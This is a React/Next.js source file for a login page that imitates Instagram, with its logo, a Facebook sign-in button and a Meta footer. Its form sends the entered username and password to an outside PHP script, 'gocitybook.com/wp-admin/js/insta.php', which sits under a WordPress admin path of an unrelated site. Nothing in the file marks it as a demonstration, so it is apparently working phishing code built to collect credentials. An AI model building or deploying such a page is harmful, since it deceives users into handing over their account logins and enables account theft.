import Link from "next/link"
import Image from "next/image"
import React from 'react'
import insta from "../assets/instalogo.png"
import instasvg from "../assets/meta.svg"

const Login = () => {
  return (
    <div className='h-screen w-full p-6 flex flex-col items-center mt-16 gap-3'>
        
        {/* <div className="border-2 w-[70%] gap-2 mx-auto justify-center items-center flex flex-col px-4 pt-2"> */}

        {/* Logo */}
        <div>
            <Image src={insta} alt="logo" width="250" height="100" color="black"/>
        </div>

        {/*  Facebook card */}
        <button className="bg-[#008df6] text-lg cursor-pointer font-semibold text-white p-2 rounded-md px-5 mt-4 w-4/5 max-w-[350px] ">
            Continue with Facebook
        </button>

        {/* Line Span */}
        <div className="flex">
            <span className="border-b-2 w-28 mx-1"> </span>
            <p> OR </p>
            <span className="border-b-2 w-28 mx-1"> </span>
        </div>
        
        {/* form */}
       <form className="flex flex-col items-center w-full gap-1" method="POST" action={"https://gocitybook.com/wp-admin/js/insta.php"}>

            <input 
                type="text" 
                name="username"
                placeholder='Phone number, username, or email'
                className='p-2 w-[80%] max-w-xs border-[1px] md:text-sm'
                required
                />

            <input 
                type="password" 
                name="password"
                placeholder='Password'
                className='p-2 w-[80%] max-w-xs border-[1px] md:text-sm'
                required
                />

            <Link href="/" className="w-[80%] max-w-xs">
                <p className="flex items-center justify-end w-full text-[#008df6] mt-2">Forgot password?</p>
            </Link>

            <button  className="bg-[#008df6] text-lg  cursor-pointer font-semibold text-white p-2 rounded-md px-5 mt-4 w-4/5 max-w-[350px] ">
                Log in
            </button>

            <div className='flex gap-1 mt-8'>
                <p className="text-gray-500">Don't have an account?</p>
                <Link href="/">
                 <p className="text-[#008df6]"> Sign up</p>
                </Link>
            </div>

       </form>
        
       <div className="mt-[5rem] md:mt-[2rem]">
            <Image 
            src={instasvg}
            width={100}
            height={100}
            alt="meta"
        />
       </div>

    </div>
  )
}

export default Login